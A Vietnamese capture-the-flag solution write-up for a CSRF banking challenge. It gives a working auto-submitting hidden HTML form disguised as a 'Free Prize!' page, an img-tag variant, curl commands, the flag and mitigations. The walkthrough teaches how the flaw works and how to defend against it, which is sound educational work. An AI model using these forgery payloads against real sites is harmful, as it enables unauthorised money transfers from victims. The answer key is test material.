# Thử thách 14: CSRFBank - Giải pháp

## Loại lỗ hổng
**Cross-Site Request Forgery (CSRF - Giả mạo yêu cầu chéo trang)**

## Mô tả
Chức năng chuyển tiền của ứng dụng ngân hàng này hoàn toàn không có cơ chế bảo vệ CSRF. Điều này cho phép kẻ tấn công tạo ra một trang web độc hại, và lừa nạn nhân truy cập vào để tự động thực hiện lệnh chuyển tiền từ tài khoản của họ sang cho kẻ tấn công.

## Mã nguồn chứa lỗ hổng
```python
# VULNERABLE: No CSRF token, no Referer check, accepts cross-origin POST
@app.route("/transfer", methods=["POST"])
def transfer():
    if "user" not in session: return redirect("/")
    # ... thực hiện chuyển tiền mà không xác thực token CSRF
```

## Khai thác (Exploit)

### Bước 1: Thu thập thông tin mục tiêu
- Bạn đăng nhập vào tài khoản `bob` và có $500 trong số dư.
- Tài khoản `alice` có $10,000 và đang giữ Flag.
- Bạn cần có hơn $9,000 để đủ điều kiện mua Flag.
- Kế hoạch: Lừa Alice chuyển $9,000 sang cho bạn.

### Bước 2: Tạo trang HTML độc hại chứa payload
Tạo một file có tên `csrf_attack.html`:
```html
<!DOCTYPE html>
<html>
<head><title>Free Prize!</title></head>
<body>
<h1>Chúc mừng! Bạn đã trúng thưởng, hãy nhấp vào đây để nhận giải!</h1>
<!-- Gửi POST request ẩn tới server mục tiêu -->
<form id="csrf" action="http://[TARGET_HOST]/transfer" method="POST">
  <input type="hidden" name="to" value="bob">
  <input type="hidden" name="amount" value="9000">
</form>
<script>
  // Tự động submit form ngay khi trang được load
  document.getElementById('csrf').submit();
</script>
</body>
</html>
```

### Bước 3: Đưa trang web lên môi trường online (Hosting)
- Dùng Python để host tại máy cục bộ: `python -m http.server 8000`
- Hoặc đưa lên các nền tảng host HTML miễn phí.

### Bước 4: Lừa Alice nhấp vào link
Trong thực tế, bạn sẽ gửi đường link này qua email hoặc chat cho Alice. Đối với hệ thống CTF:
1. Đăng nhập dưới tài khoản Alice (hoặc dùng endpoint `/alice-visits` do hệ thống cung cấp).
2. Mô phỏng việc Alice mở trang web độc hại của bạn khi cô ấy vẫn đang giữ session đăng nhập ngân hàng.
3. Form sẽ tự động submit ngầm.
4. Tiền từ Alice sẽ chuyển thẳng sang Bob.

### Bước 5: Lấy Flag
1. Đăng nhập lại dưới tư cách Bob.
2. Kiểm tra số dư (bây giờ sẽ là $9,500).
3. Đổi tiền lấy Flag trên giao diện (dashboard).

## Cách thay thế: Dùng thẻ <img> (Chỉ áp dụng nếu endpoint hỗ trợ GET)
```html
<img src="http://[TARGET_HOST]/transfer?to=bob&amount=9000" style="display:none">
```

## Khai thác tự động bằng cURL
```bash
# Đăng nhập Alice để lấy cookie phiên (session)
curl -c cookies.txt -d "username=alice&password=alice123" http://[host]/login

# Kích hoạt lệnh chuyển tiền chéo trang (Mô phỏng CSRF)
curl -b cookies.txt -d "to=bob&amount=9000" http://[host]/transfer
```

## Flag
```
FCTF{csrf_n0_t0k3n_n0_s3cur1ty}
```

## Cách hoạt động
- Lỗ hổng CSRF lợi dụng hành vi tự động đính kèm Cookie của trình duyệt vào các HTTP request.
- Khi Alice vô tình ghé thăm trang web độc hại, trình duyệt của Alice sẽ tự động gửi kèm cookie ngân hàng (session hợp lệ) tới đường dẫn `/transfer`.
- Server thấy cookie hợp lệ nên xử lý lệnh chuyển tiền một cách ngoan ngoãn.
- Alice hoàn toàn không biết lệnh chuyển tiền vừa xảy ra ở chế độ chạy ngầm (background).

## Biện pháp phòng ngừa (Mitigation)
- Triển khai Anti-CSRF Token ở phía backend:
  ```python
  from flask_wtf.csrf import CSRFProtect
  csrf = CSRFProtect(app)
  ```
- Kiểm tra chặt chẽ các header HTTP như `Origin` và `Referer`.
- Sử dụng cờ bảo mật `SameSite` cho Cookie để ngăn trình duyệt đính kèm cookie trên các request chéo domain:
  ```python
  app.config['SESSION_COOKIE_SAMESITE'] = 'Lax' # Hoặc 'Strict'
  ```
- Yêu cầu xác thực lại (nhập mật khẩu, mã OTP) cho các hành động cực kỳ nhạy cảm như chuyển tiền.
- Sử dụng mô hình Double Submit Cookie.
